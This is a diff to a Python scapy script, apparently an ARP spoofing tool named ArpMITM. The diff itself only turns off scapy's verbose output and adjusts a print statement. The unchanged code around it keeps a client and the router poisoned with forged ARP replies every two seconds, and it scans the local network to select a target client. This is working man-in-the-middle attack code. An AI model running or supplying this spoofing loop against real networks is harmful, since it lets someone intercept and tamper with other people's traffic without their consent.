@@ -23,9 +23,9 @@ class ArpMITM:
 
         while True:
             packet = scapy.ARP(op = 2, pdst = client_ip, hwdst=client_mac, psrc=router_ip)
-            scapy.send(packet)
+            scapy.send(packet, verbose = False)
             packet = scapy.ARP(op = 2, pdst = router_ip, hwdst=router_mac, psrc=client_ip)
-            scapy.send(packet)
+            scapy.send(packet, verbose = False)
             sleep(2)
 
     def scan(self, target_router_ip):
@@ -44,7 +44,7 @@ class ArpMITM:
         target_client_ip = ans[idx][1][scapy.ARP].psrc
         target_client_mac = ans[idx][1][scapy.ARP].hwsrc
         
-        print("Selected target : {}".format(target_client_ip))
+        print("Selected target : {}".format(target_client_ip), end="")
         return target_client_ip, target_client_mac, target_router_ip, target_router_mac
 
 if __name__=="__main__":
